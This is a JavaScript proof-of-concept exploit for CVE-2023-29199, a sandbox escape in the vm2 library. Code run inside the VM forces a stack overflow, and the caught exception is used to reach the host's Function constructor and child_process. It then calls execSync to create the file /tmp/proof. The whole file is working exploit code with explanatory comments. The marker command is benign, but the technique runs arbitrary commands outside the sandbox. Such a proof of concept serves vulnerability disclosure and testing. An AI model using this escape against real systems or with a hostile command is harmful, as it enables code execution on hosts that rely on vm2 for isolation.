// Import the VM class from the vm2 module to create an isolated virtual environment.
const { VM } = require("vm2");
const vm = new VM(); // Initialize a new VM instance for executing code securely.

// Define JavaScript code to be executed within the VM, demonstrating the CVE-2023-29199 vulnerability.
const code = `
  // Set up an identifier expected to be replaced during post-processing.
  aVM2_INTERNAL_TMPNAME = {};

  // Function to intentionally cause a stack overflow, simulating a host exception.
  function stack() {
    new Error().stack; // Access the stack trace, contributing to stack overflow.
    stack(); // Recursive call to self, ensures continuous execution until stack overflow.
  }

  // Attempt to execute the recursive function in a try block.
  try {
    stack(); // This call will eventually throw an error due to stack overflow.
  } catch (a$tmpname) { // Catch the error, the identifier 'a$tmpname' is crucial.
    // Exploit the caught exception object to execute arbitrary code on the host.
    a$tmpname.constructor.constructor('return process')().mainModule.require('child_process').execSync('touch /tmp/proof');
    // 'constructor.constructor' accesses the Function constructor allowing execution of arbitrary JavaScript.
  }
`

// Execute the malicious code within the VM and log any output.
console.log(vm.run(code)); // Output from executing the code, e.g., errors or return values from 'execSync'.
